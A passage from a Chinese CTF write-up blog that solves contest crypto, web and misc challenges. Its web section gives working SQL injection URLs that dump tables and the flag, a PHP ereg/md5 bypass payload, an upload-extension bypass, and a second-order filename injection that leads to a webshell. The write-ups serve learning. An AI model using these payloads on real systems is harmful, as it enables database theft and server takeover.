<p><a href="https://imgchr.com/i/kS6qQ1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/16/kS6qQ1.md.png" alt="kS6qQ1.md.png"></a></p>
<p>最后发现是与数字形状相似的字母代替数字产生的参数…… </p>
<p><strong>attention：</strong>其实可以对脚本进行优化，因为<code>e1</code>和<code>e2</code>都是和<code>φ(n)</code>互素的，所以<code>e1</code>和<code>e2</code>都是奇数，所以可以缩小<code>e1</code>和<code>e2</code>的范围，最后一个数字都是奇数，即：<code>g</code>和<code>I</code>都是奇数；</p>
<h3 id="古典密码签到题"><a href="#古典密码签到题" class="headerlink" title="古典密码签到题"></a>古典密码签到题</h3><p>这题直接告诉是棋盘密码，比较简单，给出的密文里总共有<code>ksynb</code>5个字母，所以直接构造这5个字母的全排列对应26字母表即可，总共有5!=120种不同的结果，可以直接暴破；</p>
<p><strong>暴力破解脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key=[]</span><br><span class="line">cipher=<span class="string">"ksyssskkysynbssbbnynnb"</span></span><br><span class="line">dic_cip=list(itertools.permutations(<span class="string">"ksynb"</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_cip:</span><br><span class="line">    key.append(<span class="string">''</span>.join(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> child_key <span class="keyword">in</span> key:</span><br><span class="line">    num_c=<span class="string">""</span></span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        num_c+=str(child_key.index(now_c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(num_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii=int(num_c[i])*<span class="number">5</span>+int(num_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">"i"</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        ans+=chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> child_key,ans</span><br></pre></td></tr></table></figure>
<p>发现有两种结果里面有<code>flag</code>字符，显然是第一个，排列方式为<code>skynb</code>；</p>
<p><img src="https://s2.ax1x.com/2019/01/16/kS4Yuj.png" alt="kS4Yuj.png"></p>
<h3 id="First-level"><a href="#First-level" class="headerlink" title="First level"></a>First level</h3><p>题目给出<code>e=2</code>，基本已经锁定是RSA的衍生算法rabin，yafu分解n得到p和q如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span><br><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span><br><span class="line"></span><br><span class="line">ans = 1</span><br><span class="line"></span><br><span class="line">eof; done processing batchfile</span><br></pre></td></tr></table></figure>
<p><strong>攻击脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">499900287907163903863770127517451824950591449854220282014018552802396943304674724533357663876916175459043411887269615620980351359674373127551283923032759205525834407466303318140213222438375548066871397251493100247836770129792554768759516349058673615081761638343932256849889604058608747531941928982832585706361391950223948529046950139043176720742038526998231448270490097134641169635210567151369533018545746204046992368621334939029582400285322777365958482219075297507215203709356125635202625121091161318566582307478931230962853531285514124459092351456397307588024613094226807792165876133269038363995037219677926220967578191033480631890589761476293394613074763877465067481353073032261829035532832262390121385388328585967620567497069930361644409182632934629875953161754678971744082331335000439916510067572742641854184303838362027247026467270857712018679364014951870327424723286991989268813839644982317838329022551033151317911958707603833070206941532496854730739054206016872958750645705043270396511543390465607172543992216405734971188437702405334334961918445724163241075322921116618280425131683507843396376626705861243420399065472311770119489811395486846742327683616439776584876654620796349661745998246254486950516901889112077176621805823</span></span><br><span class="line">p=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span></span><br><span class="line">q=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ans=rabin_decrypt(c,p,q,e=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ans:</span><br><span class="line">        temp=<span class="string">'&#123;:x&#125;'</span>.format(x).decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> temp:</span><br><span class="line">            <span class="keyword">print</span> temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>攻击得到4个结果，经过筛选得到一段含有flag的有意义的明文：</p>
<p><img src="https://s2.ax1x.com/2019/01/16/kSbyYn.png" alt="kSbyYn.png"></p>
<h1 id="第二次月赛"><a href="#第二次月赛" class="headerlink" title="第二次月赛"></a>第二次月赛</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>是个easy的绕过，给出源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$white_list = range(0,9);</span><br><span class="line">require_once(&apos;flag.php&apos;);</span><br><span class="line">if(isset($_REQUEST[&apos;0ver&apos;]) &amp;&amp; isset($_REQUEST[&apos;0ver1&apos;]) &amp;&amp; isset($_REQUEST[&apos;0ver2&apos;]))&#123;</span><br><span class="line">    $a = $_REQUEST[&apos;0ver&apos;];</span><br><span class="line">    $b = $_REQUEST[&apos;0ver1&apos;];</span><br><span class="line">    $c = $_REQUEST[&apos;0ver2&apos;];</span><br><span class="line">    if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)&#123;</span><br><span class="line">        echo &apos;no must be number&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(in_array($a,$white_list))&#123;</span><br><span class="line">            if(strlen($a)&gt;1)&#123;</span><br><span class="line">                if(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123;</span><br><span class="line">                    echo &quot;&lt;img src=&apos;dark.png&apos;&gt;&lt;br&gt;&quot;;</span><br><span class="line">                    echo &apos;you are a great dark phper&lt;br&gt;&apos;;</span><br><span class="line">                    echo $flag;</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                    echo &quot;you can do it!!!&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &apos;you no dark&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;you are so dark&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>考察<code>ereg()</code>和<code>md5()</code>的绕过姿势，00截断绕过<code>ereg</code>，上传数组绕过<code>md5</code>，即可得到flag如下：</p>
<p><img src="https://s2.ax1x.com/2019/01/25/kmRqk8.png" alt="kmRqk8.png"></p>
<p><strong>payload：</strong><code>http://202.119.201.199:32790/index.php?0ver=5%00a&amp;0ver1[]=a&amp;0ver2[]=b</code></p>
<h3 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h3><p>是个前端验证，只允许上传图片，不允许上传php为后缀的文件，只需要bp截取改后缀名即可；</p>
<p><a href="https://imgchr.com/i/kMY3XF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMY3XF.md.png" alt="kMY3XF.md.png"></a></p>
<h3 id="小型线上赌场"><a href="#小型线上赌场" class="headerlink" title="小型线上赌场"></a>小型线上赌场</h3><p>一开始没有思路，毕竟是萌新还没有了解到CTF的很多姿势，请教大佬得知是vim文件泄露，在vim编辑的时候没有正常退出，系统就会自动生成一个swp文件用来日后的恢复；直接down下来，vim打开得源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$invest = $_GET[&apos;invest&apos;];  </span><br><span class="line">	$rand = rand(2,50);  </span><br><span class="line">	$len = strlen(trim($_GET[&apos;invest&apos;]));</span><br><span class="line">	foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">	    if(!is_numeric($value)||$value == &apos;0&apos;)&#123;</span><br><span class="line">	        die(&apos;no no no!&apos;);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$money = number_format($invest*$rand);</span><br><span class="line">	$money = intval(str_replace(&apos;,&apos;,&apos;&apos;,$money));</span><br><span class="line">	$guess = intval($_GET[&apos;guess&apos;]); </span><br><span class="line">	if ($guess == $money &amp;&amp; strlen($money)===$len)&#123;</span><br><span class="line">	    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看懂源码意思即可，生成<code>2~50</code>的随机数<code>rand</code>，<code>money</code>为<code>$invest*$rand</code>；如果<code>$money==$guess</code>就回显flag，即<code>invest*倍数==guess</code>即可，那我们可以直接直接bp爆破，猜一个<code>guess</code>，固定<code>invest</code>和<code>guess</code>的值，多次爆破，如果次数达到一定的上限一定会出现猜对倍数的情况，这样的话就会输出flag；</p>
<p><strong>bp爆破设置：</strong></p>
<ol>
<li><p>不设置变量；</p>
<p><a href="https://imgchr.com/i/kMdro4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdro4.md.png" alt="kMdro4.md.png"></a></p>
</li>
<li><p>设置payload类型为<code>null payloads</code>，上限次数设置大一点为2000；</p>
<p><a href="https://imgchr.com/i/kMdEIH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdEIH.md.png" alt="kMdEIH.md.png"></a></p>
</li>
<li><p>随便设置一下options即可start；</p>
</li>
</ol>
<p><strong>结果：</strong></p>
<p>升序排列length即可发现不匹配的特殊项，发现flag；</p>
<p><a href="https://imgchr.com/i/kMdfOK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdfOK.md.png" alt="kMdfOK.md.png"></a></p>
<p><a href="https://imgchr.com/i/kMdqSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdqSI.md.png" alt="kMdqSI.md.png"></a></p>
<h3 id="SimpleSQLi"><a href="#SimpleSQLi" class="headerlink" title="SimpleSQLi"></a>SimpleSQLi</h3><ol>
<li>首先输入<code>?id=1%27</code>报错；</li>
<li>接着注释掉后面的引号<code>?id=1%27%23</code>，回显正常，说明猜测成功存在注入点；</li>
</ol>
<p><img src="https://s2.ax1x.com/2019/01/25/kmW7v9.png" alt="kmW7v9.png"></p>
<ol start="3">
<li>接下来就是用order by去猜列数，<code>?id=1%27%20order%20by%203%23</code>回显正常应该是三列没错；</li>
<li>下面需要用union select去回显某一列的东西，构造<code>?id=-1%27%20union%20select%201,2,3%23</code>；这里需要第一句话为空才能显示后面一句话的内容，选择id=-1，就可以回显2和3，后面就可以利用这两列回显想要的东西；</li>
</ol>
<p><img src="https://s2.ax1x.com/2019/01/25/kmfwrR.png" alt="kmfwrR.png"></p>
<ol start="5">
<li>爆库名：<code>?id=-1%27%20union%20select%201,2,database()%20%23</code>为<code>security</code></li>
</ol>
<p><img src="https://s2.ax1x.com/2019/01/25/kmhMWD.png" alt="kmhMWD.png"></p>
<ol start="6">
<li>爆表名，此处使用mysql里面自带的information_schema表；<code>id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</code>发现flag表信息；</li>
</ol>
<p><img src="https://s2.ax1x.com/2019/01/25/kmfjLn.png" alt="kmfjLn.png"></p>
<ol start="7">
<li>爆列名：<code>id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flagishere%27%23</code>有Id和flag两列；</li>
</ol>
<p><img src="https://s2.ax1x.com/2019/01/25/kmhBlQ.png" alt="kmhBlQ.png"></p>
<ol start="8">
<li>爆值：<code>?id=-1%27%20union%20select%201,2,group_concat(Id,0x3a,flag)%20from%20flagishere%23</code></li>
</ol>
<p><img src="https://s2.ax1x.com/2019/01/25/kmh4l4.png" alt="kmh4l4.png"></p>
<h3 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h3><p>队友Source在离别歌的blog里搜索到类似题目，了解到这题的切入点是二次注入；直接拿来payload就可以搞定这一题；</p>
<ol>
<li><p>先选择文件进行上传，filename为<code>&#39;,extension=&#39;&#39;,filename=&#39;x.jpg.jpg</code>；<img src="https://s2.ax1x.com/2019/01/28/kM0tK0.png" alt="kM0tK0.png"></p>
</li>
<li><p>Rename file，注入后文件系统中文件名为<code>xl.jpg.jpg</code><img src="https://s2.ax1x.com/2019/01/28/kM02qK.png" alt="kM02qK.png"></p>
</li>
<li><p>上传真的包含webshell的文件；<img src="https://s2.ax1x.com/2019/01/28/kMBUSA.png" alt="kMBUSA.png"></p>
</li>
<li><p>改名后缀为<code>.php</code>，连接菜刀即可；<img src="https://s2.ax1x.com/2019/01/28/kMBrTS.png" alt="kMBrTS.png"></p>
</li>
<li><p>flag在根目录；</p>
<p><a href="https://imgchr.com/i/kuqufs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/27/kuqufs.md.png" alt="kuqufs.md.png"></a><a href="https://imgchr.com/i/kuq1XV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/27/kuq1XV.md.png" alt="kuq1XV.md.png"></a></p>
</li>
</ol>
<p>参考链接：<a href="https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html" target="_blank" rel="noopener">leavesongs的博客</a></p>
<h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h3><p>一度以为是hash，因为base64decode出来是<code>Salted__</code>开头，真的是……被出题人虐到鼻青脸肿，和队里大佬讨论很久也不知道怎么办，还一度以为是AES，hint出来了是DES，也不知道密钥该如何解密……没想带直接找一个在线网站直接解密既可以了……密钥为空…… 狂喷一口老血……<img src="https://s2.ax1x.com/2019/01/25/km4Jc4.png" alt="km4Jc4.png"></p>
<p><a href="https://imgchr.com/i/km4V1g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km4V1g.md.png" alt="km4V1g.md.png"></a></p>
<p>在线解密一次以后再解一次即可得到flag：</p>
<p><a href="https://imgchr.com/i/km4buj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km4buj.md.png" alt="km4buj.md.png"></a></p>
<p>这就是双重DES……</p>
<h3 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h3><p>也是解的很暴躁的一题，基本就是大家一开始都是base32出来就不知道那是什么玩意了……</p>
<p><a href="https://imgchr.com/i/km5n2D" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km5n2D.md.png" alt="km5n2D.md.png"></a></p>
<p>翻看各种大佬的博客总结古典密码都没有这种奇怪的符号……直到队友解出来的那一刻我都是懵逼的(SourceNB)，放上解题脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"LZYGQ326N5QXMYAKORNG42TABJ2FUWS2MNRWG6A="</span></span><br><span class="line">c=base64.b32decode(s)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> c:</span><br><span class="line">        ans+=chr((ord(x)+i)%<span class="number">128</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ctf'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure>
<p>在ASCII码内凯撒爆破即可：</p>
<p><img src="https://s2.ax1x.com/2019/01/25/km5oIx.png" alt="km5oIx.png"></p>
<p>慢着…这16进制是什么鬼……大胆猜测是easy_soeasy__hhh，填入果然没错……</p>
<p>总的来说做这两题的心情就是可以狂扁出题人小朋友了……</p>
<p><a href="https://imgchr.com/i/km5zdI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km5zdI.md.png" alt="km5zdI.md.png"></a></p>
<h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>这题终于不是前面两题那么让人流泪了……，n和c里只出现了12个字符猜测是12进制；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5</span><br><span class="line">e=5</span><br><span class="line">c=411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065</span><br></pre></td></tr></table></figure>
<p>给出以下信息，<code>e=5</code>，猜测是低指数攻击，上解题脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">twl_to_dec</span><span class="params">(twl)</span>:</span></span><br><span class="line">	ans=<span class="number">0</span></span><br><span class="line">	l=len(twl)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">		<span class="keyword">if</span> twl[i]==<span class="string">'A'</span>:</span><br><span class="line">			temp=<span class="number">10</span></span><br><span class="line">		<span class="keyword">elif</span> twl[i]==<span class="string">'b'</span>:</span><br><span class="line">			temp=<span class="number">11</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			temp=int(twl[i],<span class="number">10</span>)</span><br><span class="line">		ans+=temp*pow(<span class="number">12</span>,l-i<span class="number">-1</span>)</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_msg</span><span class="params">(c,n,e)</span>:</span></span><br><span class="line">	i=<span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, e)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">	        x = gmpy2.iroot(c+i*n, e)[<span class="number">0</span>]</span><br><span class="line">	        <span class="keyword">print</span> hex(x)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">	        <span class="keyword">break</span></span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	n=<span class="string">"36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5"</span></span><br><span class="line">	c=<span class="string">"411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065"</span></span><br><span class="line">	e=<span class="number">5</span></span><br><span class="line">	n=twl_to_dec(n)</span><br><span class="line">	c=twl_to_dec(c)</span><br><span class="line">	small_msg(c,n,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>12进制转化为 10进制以后直接进行小公钥指数攻击即可，得到flag：</p>
<p><img src="https://s2.ax1x.com/2019/01/28/kM2DiV.png" alt="kM2DiV.png"></p>
<p><strong>友情提示：</strong>自己写的进制转换虽然丑，but肯定比网上在线转换靠谱（微笑.jpg）</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc签到"><a href="#Misc签到" class="headerlink" title="Misc签到"></a>Misc签到</h3><p>得到盲文图片如下，直接对应盲文表解出flag内容为：<code>BAIND</code>，将A换为1，加上flag提交即可；</p>
<p><img src="https://s2.ax1x.com/2019/01/28/kMBHfJ.png" alt="kMBHfJ.png"></p>
<h3 id="BXS图标真好看"><a href="#BXS图标真好看" class="headerlink" title="BXS图标真好看"></a>BXS图标真好看</h3><p>打开是个txt文件，查看内容发现<code>IDHR</code>关键字，猜测是png图片，直接改掉后缀得到一张图片；</p>
<p><img src="https://s2.ax1x.com/2019/01/28/kMDah4.png" alt="kMDah4.png"></p>
<p>发现flag相关内容，猜测是凯撒移位，但发现前面有8位，果断推翻猜想，继续猜测是栅栏密码，果然得到flag；</p>
<p><img src="https://s2.ax1x.com/2019/01/28/kMDvgs.png" alt="kMDvgs.png"></p>
<h3 id="base全家桶了解一下"><a href="#base全家桶了解一下" class="headerlink" title="base全家桶了解一下"></a>base全家桶了解一下</h3><p>nctf遇到过差不多的题，没什么难度；</p>
<p>解密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"R1kzRE1RWldHRTNET04yQ0dVM1RNTkpXSU0zREdNWlFHWkNETU5KVklZM1RJTVpRR01ZREtSUldHTTNUS05TRUc0MkRNTVpYR1EzRE1OMkU="</span></span><br><span class="line">c=base64.b64decode(s)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line">d=base64.b32decode(c)</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">e=base64.b16decode(d)</span><br><span class="line"><span class="keyword">print</span> e</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/kMroRJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMroRJ.md.png" alt="kMroRJ.md.png"></a></p>
<h3 id="起床改error啦"><a href="#起床改error啦" class="headerlink" title="起床改error啦"></a>起床改error啦</h3><p>唯一做到的Misc……队友Source太给力……拿到手是个png图片</p>
<p><img src="https://s2.ax1x.com/2019/01/28/kMsCQA.jpg" alt="kMsCQA.jpg"></p>
<p>丢进十六进制编辑器，发现猫腻，有zip文件头和flag信息；</p>
<p><img src="https://s2.ax1x.com/2019/01/28/kMsAdf.png" alt="kMsAdf.png"></p>
<p>扒下来另存为zip，解压得到flag.doc，但是里面没有flag；</p>
<p><img src="https://s2.ax1x.com/2019/01/28/kMs3wV.png" alt="kMs3wV.png"></p>
<p>提示直接告诉是doc隐写，那就显示隐藏文字即可，得到flag；</p>
